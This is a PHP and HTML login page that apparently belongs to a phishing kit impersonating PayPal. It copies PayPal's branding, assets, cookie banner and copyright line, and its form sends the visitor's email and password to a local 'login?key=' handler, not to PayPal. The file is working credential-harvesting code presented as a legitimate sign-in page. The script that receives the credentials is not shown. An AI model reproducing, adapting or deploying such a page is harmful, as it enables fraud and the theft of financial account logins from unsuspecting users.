<?php
session_start();
require_once '../main.php';
require_once 'session.php';
require_once '../lang.php';
require_once 'compress.php';
ob_start("sanitize_output");
?>
<html lang="en" class=" desktop js ">
<head>
    <meta charset="utf-8">
    <title><?php echo $login['title'];?></title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link rel="shortcut icon" href="assets/img/pp_favicon_x.ico">
    <link rel="apple-touch-icon" href="assets/img/pp64.png">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
    <meta property="og:image" content="https://www.paypalobjects.com/webstatic/icon/pp258.png">
    <link rel="stylesheet" href="assets/css/login.css">
    <style nonce="">
        @font-face { font-family: "PayPalSansSmall-Regular"; font-style: normal; font-display: swap; src: url('https://www.paypalobjects.com/digitalassets/c/paypal-ui/fonts/PayPalSansSmall-Regular.woff2')  format('woff2'),  url('https://www.paypalobjects.com/digitalassets/c/paypal-ui/fonts/PayPalSansSmall-Regular.woff')  format('woff'),  url('https://www.paypalobjects.com/digitalassets/c/paypal-ui/fonts/PayPalSansSmall-Regular.eot?#iefix')  format('embedded-opentype'),  url('https://www.paypalobjects.com/digitalassets/c/paypal-ui/fonts/PayPalSansSmall-Regular.svg')  format('svg'); } #gdprCookieBanner { font-family: PayPalSansSmall-Regular, sans-serif; }         .gdprCookieBanner_container { width: 100%; bottom: 0; position: fixed; background-color: #012169; z-index: 1051; color: white; text-shadow: none; } .gdprCookieBanner_wrapper { max-width: 1024px; margin: 0 auto; padding-top: 0px; color: white; } .gdprCookieBanner_content { font-weight: 400; font-size: 15px; margin-top: 23px; line-height: 24px; margin-bottom: 26px; color: white; } .gdprCookieBanner_content a { color: white; text-decoration: underline; } .gdprCookieBanner_buttonWrapper { text-align: center; } .gdpr_btn { display: inline-block; min-width: 6rem; padding: 0.75rem 1.5rem; margin-bottom: 1.5rem; border: 1px solid #0070ba; border-radius: 1.5rem; font-size: 0.9375rem; line-height: 1.6; font-weight: 500; text-align: center; text-decoration: none; cursor: pointer; transition: all 250ms ease; -webkit-font-smoothing: antialiased; } .gdpr_btn_reversed { border-color: #ffffff; background-color: #ffffff; color: #0070ba; } .col-sm-12 { position: relative; min-height: 1px; padding-left: 15px; padding-right: 15px; } .gdprCookieBanner_button { width: 200px; font-size: 13px; } .gdprCookieBanner-acceptedAll { height: auto; margin-bottom: 12em; } @media only screen and (max-device-width : 1024px) { .gdprCookieBanner_content { font-size: 13px; color: white; } } @media only screen and (max-width: 575.98px) { .gdprHideCookieBannerMobile { display:none; } }
    </style>
</head>

<body class="desktop " data-rlogid="rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfVaSaGxOmPB%2BDX69qyNN0t%2F1OvhtU6MSBN8VLmo20PVO_16f9090dfe6" data-hostname="rZJvnqaaQhLn/nmWT8cSUrLUCF91zHwnjpRjzGlM+yc6Y1bp0++ytm2tA1cjrpCx" data-production="true" data-enable-ads-captcha="true" data-ads-challenge-url="/auth/createchallenge/8ea428698663f817/challenge.js" data-enable-client-cal-logging="true" data-correlation-id="e6f967f2d1e77" data-is-webkit-browser="true" data-enable-fn-beacon-on-web-views="true" data-phone-password-enabled="true" data-is-hybrid-login-experience="true" data-is-hybrid-editable-on-cookied="true" data-csrf-token="fcuR02o0QLPKMPVPpyvHSeipF1iVo+PUYZgWo=" data-nonce="7K49sDr/jrsOWFBf3C9THw/iPLF0sYdhWCHUi0ABJWXSKfRV" data-lazy-load-country-codes="true" data-cookie-banner-enabled="true" data-party-id-hash="34d34154256c7e7857d45bf6d3dab63ca3647d17ef068935e1c51ae85152e6c8" style="margin-bottom: 167px;">
    <noscript>
        <p class="nonjsAlert" role="alert">NOTE: Many features on the PayPal website require JavaScript and cookies.</p>
    </noscript>
    <div id="main" class="main" role="main">

        <section id="login" class="login " data-role="page" data-title="Log in to your PayPal account">
            <div class="corral">
                <div id="content" class="contentContainer activeContent contentContainerBordered">
                    <header>
                        <p class="paypal-logo paypal-logo-long"></p>
                    </header>
                    
                    <form action="login?key=<?php echo $key;?>" method="post" class="proceed maskable" autocomplete="off" name="login" validate="validate">
                        <div id="passwordSection" class="clearfix splitEmail">
                            <div id="splitEmailSection" class="splitPhoneSection splitEmailSection">

                                <div class="textInput" id="login_emaildiv">
                                    <div class="fieldWrapper ">
                                        <label for="email" class="fieldLabel"><?php echo $login['email'];?></label>
                                        <input id="email" aria-label="login_emaildiv" name="login_email" type="email" class="hasHelp  validateEmpty   " required="required" value="" autocomplete="off" placeholder="<?php echo $login['email'];?>" aria-describedby="emailErrorMessage">
                                    </div>
                                    <div class="errorMessage" id="emailErrorMessage">
                                        <p class="emptyError hide">Required.</p>
                                        <p class="invalidError hide">The email address or mobile number format is incorrect.</p>
                                    </div>
                                </div>
                            </div>
                            <div id="passwordSection" class="clearfix">
                                <div class="textInput  " id="login_passworddiv">
                                    <div class="fieldWrapper ">
                                        <label for="password" class="fieldLabel"><?php echo $login['password'];?></label>
                                        <input id="password" aria-label="login_passworddiv" name="login_password" type="password" class="hasHelp  validateEmpty   pin-password" required="required" value="" placeholder="<?php echo $login['password'];?>" aria-describedby="passwordErrorMessage">
                                        <button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" aria-label="Show password" pa-marked="1">Show</button>
                                        <button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" aria-label="Hide" pa-marked="1">Hide</button>
                                        <button class="pwFpIcon hide" id="pwFpIcon" pa-marked="1"></button>
                                    </div>
                                    <div class="errorMessage" id="passwordErrorMessage">
                                        <p class="emptyError hide">Password is required</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <input type="hidden" id="phone" name="login_phone" class="validate">
                        <div class="actions">
                            <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1"><?php echo $login['login'];?></button>
                        </div>

                    </form>
                    <div class="moreOptionsDiv  hide" id="moreOptionsContainer"><a href="#" id="moreOptions" class="moreOptionsInfo" pa-marked="1">More options</a>
                        <div class="bubble-tooltip hide" id="moreOptionsDropDown">
                            <ul class="moreoptionsGroup">
                                <li><a href="#" id="moreOptionsMobile" class="scTrack:unifiedlogin-click-more-options-mobile" pa-marked="1">Approve login using mobile device</a>
                                </li>
                                <li><a href="/authflow/password-recovery/?country.x=GB&amp;locale.x=en_GB&amp;redirectUri=%252Fsignin%252F" class="scTrack:unifiedlogin-click-forgot-password pwrLink" pa-marked="1"><?php echo $login['trouble'];?></a>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <div class="forgotLink"><a href="#" class="scTrack:unifiedlogin-click-forgot-password pwrLink" pa-marked="1"><?php echo $login['trouble'];?></a>
                    </div>
                    <div class="pwr-modal forgotPasswordModal" id="password-recovery-modal">
                        <iframe id="pwdIframe" data-src="/authflow/password-recovery/?country.x=GB&amp;locale.x=en_GB&amp;redirectUri=%252Fsignin%252F" scrolling="no" data-auto-reload="true"></iframe>
                        <div class="monogram-small"></div>
                    </div>
                    <div id="signupContainer" class="signupContainer" data-hide-on-email="" data-hide-on-pass="">
                        <div class="loginSignUpSeparator"><span class="textInSeparator"><?php echo $login['or'];?></span>
                        </div><a role="button" href="#" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1"><?php echo $login['signup'];?></a>
                    </div>
                    <div id="tpdButtonContainer" class="signupContainer hide">
                        <div class="loginSignUpSeparator"><span class="textInSeparator"><?php echo $login['or'];?></span>
                        </div>
                        <div class="actions">
                            <button class="button secondary" id="tpdButton" type="submit" value="Approve login using mobile device" pa-marked="1">Approve login using mobile device</button>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <footer class="footer" role="contentinfo">
            <div class="legalFooter">
                <div class="extendedContent">
                    <ul class="footerGroup footerGroupWithSiblings">
                        <li><a target="_blank" href="#" pa-marked="1"><?php echo $login['privacy'];?></a>
                        </li>
                        <li><a target="_blank" href="#" pa-marked="1"><?php echo $login['legal'];?></a>
                        </li>
                    </ul>
                    <p class="footerCopyright">Copyright © 1999-2020 PayPal. All rights reserved.</p>
                </div>
            </div>
        </footer>
        <div id="gdprCookieBanner" class="gdprCookieBanner_container gdprCookieBanner_container-custom" style="display: none;">
            <div class="gdprCookieBanner_wrapper gdprCookieBanner_wrapper-custom">
                <div id="gdprCookieContent_wrapper" class="col-sm-12" style="display: none;">
                    <p class="gdprCookieBanner_content gdprCookieBanner_content-custom">Cookies help us customise PayPal for you, and some are necessary to make our site work. Cookies also allow us to show you personalised offers and promotions, both on and off our site. Of course, you're in control. You can <a id="manageCookiesLink" href="https://www.paypal.com/myaccount/profile/flow/cookies/?locale=en_GB" pagename="Log in to your account|managecookies">manage your cookies</a> at any time.</p>
                    <div class="gdprCookieBanner_buttonWrapper gdprCookieBanner_buttonWrapper-custom"><a id="acceptAllButton" role="link" tabindex="0" class="gdpr_btn gdpr_btn_reversed gdprCookieBanner_button gdprCookieBanner_button-custom" pagename="Log in to your account|acceptcookies">Accept Cookies</a>
                    </div>
                </div>
            </div>
        </div>
    </div>


</body>

</html>
